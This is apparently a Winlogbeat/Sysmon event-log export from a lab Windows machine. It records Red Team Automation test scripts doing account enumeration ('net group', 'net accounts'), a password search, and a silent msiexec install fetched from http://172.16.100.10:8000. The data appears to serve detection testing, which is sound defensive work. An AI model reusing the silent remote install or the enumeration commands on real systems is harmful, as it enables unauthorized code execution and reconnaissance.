{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4A1C-5BA2-0000-0010C8100B00}","Product":"Betriebssystem Microsoft® Windows®","UtcTime":"2018-09-19 13:09:51.125","User":"flare-PC\\flare","Description":"Windows-Befehlsprozessor","Hashes":"MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE","Image":"C:\\Windows\\SysWOW64\\cmd.exe","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","TerminalSessionId":"1","CommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\installutil_network.py\"","Company":"Microsoft Corporation","ProcessId":"3812","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","IntegrityLevel":"Medium","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ParentProcessId":"3756","LogonId":"0xe320","ProcessGuid":"{2D3B23BE-4A9F-5BA2-0000-001060831100}"},"@timestamp":"2018-09-19T13:09:51.141Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:51.125\nProcessGuid: {2D3B23BE-4A9F-5BA2-0000-001060831100}\nProcessId: 3812\nImage: C:\\Windows\\SysWOW64\\cmd.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows-Befehlsprozessor\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\installutil_network.py\"\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE\nParentProcessGuid: {2D3B23BE-4A1C-5BA2-0000-0010C8100B00}\nParentProcessId: 3756\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1254","event_id":1,"version":5,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"task":"Process Create (rule: ProcessCreate)","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"9l_08WUBfVn9xHWiHzvY"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4A1C-5BA2-0000-0010C8100B00}","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:09:36.759","Image":"C:\\Windows\\SysWOW64\\cmd.exe","Description":"Windows-Befehlsprozessor","LogonId":"0xe320","Product":"Betriebssystem Microsoft® Windows®","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","TerminalSessionId":"1","CommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\findstr_pw_search.py\"","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","IntegrityLevel":"Medium","ProcessId":"1296","ParentProcessId":"3756","Hashes":"MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE","ProcessGuid":"{2D3B23BE-4A90-5BA2-0000-00106FC30E00}"},"@timestamp":"2018-09-19T13:09:36.775Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:36.759\nProcessGuid: {2D3B23BE-4A90-5BA2-0000-00106FC30E00}\nProcessId: 1296\nImage: C:\\Windows\\SysWOW64\\cmd.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows-Befehlsprozessor\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\findstr_pw_search.py\"\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE\nParentProcessGuid: {2D3B23BE-4A1C-5BA2-0000-0010C8100B00}\nParentProcessId: 3756\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","record_number":"1249","type":"wineventlog","host":{"name":"flare-PC"},"user":{"name":"SYSTEM","domain":"NT-AUTORITÄT","type":"User","identifier":"S-1-5-18"},"version":5,"event_id":1,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"41_z8WUBfVn9xHWivjtZ"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","Product":"Microsoft® Windows® Operating System","ParentProcessGuid":"{2D3B23BE-4A74-5BA2-0000-00107B910D00}","Hashes":"MD5=B9A4DAC2192FD78CDA097BFA79F6E7B2,SHA256=D468E6B1B79555AC8BCE0300942FD479689EB8F159F3A399848D3BF9B9990A56","Description":"Net Command","Image":"C:\\Windows\\SysWOW64\\net.exe","User":"flare-PC\\flare","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\enum_commands.py","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","Company":"Microsoft Corporation","CommandLine":"net group","ParentProcessId":"2304","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"2348","IntegrityLevel":"Medium","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","TerminalSessionId":"1","UtcTime":"2018-09-19 13:09:11.986","ProcessGuid":"{2D3B23BE-4A77-5BA2-0000-0010CCF50D00}"},"@timestamp":"2018-09-19T13:09:11.986Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:11.986\nProcessGuid: {2D3B23BE-4A77-5BA2-0000-0010CCF50D00}\nProcessId: 2348\nImage: C:\\Windows\\SysWOW64\\net.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Net Command\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nCommandLine: net group\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=B9A4DAC2192FD78CDA097BFA79F6E7B2,SHA256=D468E6B1B79555AC8BCE0300942FD479689EB8F159F3A399848D3BF9B9990A56\nParentProcessGuid: {2D3B23BE-4A74-5BA2-0000-00107B910D00}\nParentProcessId: 2304\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\enum_commands.py","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","event_id":1,"type":"wineventlog","version":5,"user":{"name":"SYSTEM","domain":"NT-AUTORITÄT","type":"User","identifier":"S-1-5-18"},"host":{"name":"flare-PC"},"record_number":"1237","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"21_z8WUBfVn9xHWivjtZ"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","Product":"Microsoft® Windows® Operating System","UtcTime":"2018-09-19 13:09:11.919","User":"flare-PC\\flare","Description":"Net Command","ParentProcessGuid":"{2D3B23BE-4A77-5BA2-0000-00109CF00D00}","Image":"C:\\Windows\\SysWOW64\\net1.exe","ParentImage":"C:\\Windows\\SysWOW64\\net.exe","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","ParentCommandLine":"net accounts","TerminalSessionId":"1","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","ParentProcessId":"1760","Company":"Microsoft Corporation","ProcessId":"3804","IntegrityLevel":"Medium","CommandLine":"C:\\Windows\\system32\\net1 accounts","Hashes":"MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessGuid":"{2D3B23BE-4A77-5BA2-0000-001093F10D00}"},"@timestamp":"2018-09-19T13:09:11.919Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"@version":"1","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:11.919\nProcessGuid: {2D3B23BE-4A77-5BA2-0000-001093F10D00}\nProcessId: 3804\nImage: C:\\Windows\\SysWOW64\\net1.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Net Command\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\net1 accounts\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347\nParentProcessGuid: {2D3B23BE-4A77-5BA2-0000-00109CF00D00}\nParentProcessId: 1760\nParentImage: C:\\Windows\\SysWOW64\\net.exe\nParentCommandLine: net accounts","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":1,"record_number":"1234","host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"task":"Process Create (rule: ProcessCreate)","version":5,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"s1_z8WUBfVn9xHWigTvw"}}
{"thread_id":3952,"event_data":{"param2":"Beendet","param1":"WinHTTP-Web Proxy Auto-Discovery-Dienst","Binary":"570069006E0048007400740070004100750074006F00500072006F00780079005300760063002F0031000000"},"@timestamp":"2018-09-19T13:08:58.852Z","keywords":["Klassisch"],"log_name":"System","level":"Informationen","computer_name":"flare-PC","source_name":"Service Control Manager","process_id":488,"message":"Dienst \"WinHTTP-Web Proxy Auto-Discovery-Dienst\" befindet sich jetzt im Status \"Beendet\".","@version":"1","provider_guid":"{555908d1-a6d7-4695-8e1e-26931d2012f4}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"11742","event_id":7036,"host":{"name":"flare-PC"}}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"K1_18WUBfVn9xHWiaTxG"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:10:54.728","Image":"C:\\Windows\\SysWOW64\\cmd.exe","Description":"Windows-Befehlsprozessor","Hashes":"MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE","ParentProcessGuid":"{2D3B23BE-4A1C-5BA2-0000-0010C8100B00}","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\msiexec_http_installer.py\"","ParentProcessId":"3756","TerminalSessionId":"1","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","IntegrityLevel":"Medium","Company":"Microsoft Corporation","Product":"Betriebssystem Microsoft® Windows®","ProcessId":"2808","ProcessGuid":"{2D3B23BE-4ADE-5BA2-0000-00108D4A1400}"},"@timestamp":"2018-09-19T13:10:54.744Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:10:54.728\nProcessGuid: {2D3B23BE-4ADE-5BA2-0000-00108D4A1400}\nProcessId: 2808\nImage: C:\\Windows\\SysWOW64\\cmd.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows-Befehlsprozessor\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\msiexec_http_installer.py\"\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE\nParentProcessGuid: {2D3B23BE-4A1C-5BA2-0000-0010C8100B00}\nParentProcessId: 3756\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","event_id":1,"type":"wineventlog","version":5,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"record_number":"1302","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"LV_18WUBfVn9xHWiaTxJ"}}
{"event_data":{"param1":"http://172.16.100.10:8000/bin/Installer.msi","param5":"(NULL)","param3":"(NULL)","param4":"(NULL)","param6":"(NULL)","param2":"3468"},"@timestamp":"2018-09-19T13:10:57.000Z","keywords":["Klassisch"],"log_name":"Application","level":"Informationen","computer_name":"flare-PC","source_name":"MsiInstaller","message":"Eine Windows Installer-Transaktion wird gestartet: http://172.16.100.10:8000/bin/Installer.msi. Clientprozess-ID: 3468.","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"2396","event_id":1040,"host":{"name":"flare-PC"},"user":{"name":"flare","identifier":"S-1-5-21-4019173901-3792766986-1456451320-1001","domain":"flare-PC","type":"User"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"MV_18WUBfVn9xHWicjxS"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:10:57.223","Hashes":"MD5=3C4C3A520CE2B15C81307D800FC2B7F6,SHA256=02D54BBA4210372805393E907827C3A8C1076BDE5DE0C9C63443104306BECA8D","Description":"Windows® Installer","Image":"C:\\Windows\\SysWOW64\\msiexec.exe","Product":"Windows Installer - Unicode","FileVersion":"5.0.7600.16385 (win7_rtm.090713-1255)","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\msiexec_http_installer.py","Company":"Microsoft Corporation","CommandLine":"msiexec.exe /quiet /i http://172.16.100.10:8000/bin/Installer.msi","ParentProcessId":"3448","ProcessId":"3468","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\","IntegrityLevel":"Medium","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","TerminalSessionId":"1","ParentProcessGuid":"{2D3B23BE-4ADE-5BA2-0000-0010D64B1400}","ProcessGuid":"{2D3B23BE-4AE1-5BA2-0000-0010F0B51400}"},"@timestamp":"2018-09-19T13:10:57.223Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:10:57.223\nProcessGuid: {2D3B23BE-4AE1-5BA2-0000-0010F0B51400}\nProcessId: 3468\nImage: C:\\Windows\\SysWOW64\\msiexec.exe\nFileVersion: 5.0.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows® Installer\nProduct: Windows Installer - Unicode\nCompany: Microsoft Corporation\nCommandLine: msiexec.exe /quiet /i http://172.16.100.10:8000/bin/Installer.msi\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=3C4C3A520CE2B15C81307D800FC2B7F6,SHA256=02D54BBA4210372805393E907827C3A8C1076BDE5DE0C9C63443104306BECA8D\nParentProcessGuid: {2D3B23BE-4ADE-5BA2-0000-0010D64B1400}\nParentProcessId: 3448\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\msiexec_http_installer.py","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","record_number":"1305","event_id":1,"version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"host":{"name":"flare-PC"},"type":"wineventlog","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"L1_18WUBfVn9xHWicjxS"}}
{"thread_id":1824,"event_data":{"LogonId":"0x3e7","Product":"Windows Installer - Unicode","ParentProcessGuid":"{2D3B23BE-45CA-5BA2-0000-00104A5C0000}","Image":"C:\\Windows\\System32\\msiexec.exe","Description":"Windows® Installer","Hashes":"MD5=31E27D80332A83C1417480F2119E9366,SHA256=4FBF73AC4A71B9E3D549D1C13FF09ED283DEA60FCA4E19C18E800527D30D2B54","UtcTime":"2018-09-19 13:10:57.301","ParentImage":"C:\\Windows\\System32\\services.exe","ParentCommandLine":"C:\\Windows\\system32\\services.exe","FileVersion":"5.0.7600.16385 (win7_rtm.090713-1255)","Company":"Microsoft Corporation","LogonGuid":"{2D3B23BE-45CA-5BA2-0000-0020E7030000}","CurrentDirectory":"C:\\Windows\\system32\\","ProcessId":"172","ParentProcessId":"488","CommandLine":"C:\\Windows\\system32\\msiexec.exe /V","IntegrityLevel":"System","User":"NT-AUTORITÄT\\SYSTEM","TerminalSessionId":"0","ProcessGuid":"{2D3B23BE-4AE1-5BA2-0000-0010C9BA1400}"},"@timestamp":"2018-09-19T13:10:57.301Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:10:57.301\nProcessGuid: {2D3B23BE-4AE1-5BA2-0000-0010C9BA1400}\nProcessId: 172\nImage: C:\\Windows\\System32\\msiexec.exe\nFileVersion: 5.0.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows® Installer\nProduct: Windows Installer - Unicode\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\msiexec.exe /V\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT-AUTORITÄT\\SYSTEM\nLogonGuid: {2D3B23BE-45CA-5BA2-0000-0020E7030000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: MD5=31E27D80332A83C1417480F2119E9366,SHA256=4FBF73AC4A71B9E3D549D1C13FF09ED283DEA60FCA4E19C18E800527D30D2B54\nParentProcessGuid: {2D3B23BE-45CA-5BA2-0000-00104A5C0000}\nParentProcessId: 488\nParentImage: C:\\Windows\\System32\\services.exe\nParentCommandLine: C:\\Windows\\system32\\services.exe","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":1,"task":"Process Create (rule: ProcessCreate)","version":5,"host":{"name":"flare-PC"},"record_number":"1306","user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"M1_18WUBfVn9xHWicjxS"}}
{"thread_id":3952,"event_data":{"param2":"Ausgeführt","Binary":"6D00730069007300650072007600650072002F0034000000","param1":"Windows Installer"},"@timestamp":"2018-09-19T13:10:57.333Z","log_name":"System","keywords":["Klassisch"],"level":"Informationen","computer_name":"flare-PC","source_name":"Service Control Manager","process_id":488,"message":"Dienst \"Windows Installer\" befindet sich jetzt im Status \"Ausgeführt\".","@version":"1","provider_guid":"{555908d1-a6d7-4695-8e1e-26931d2012f4}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":7036,"record_number":"11746","host":{"name":"flare-PC"}}
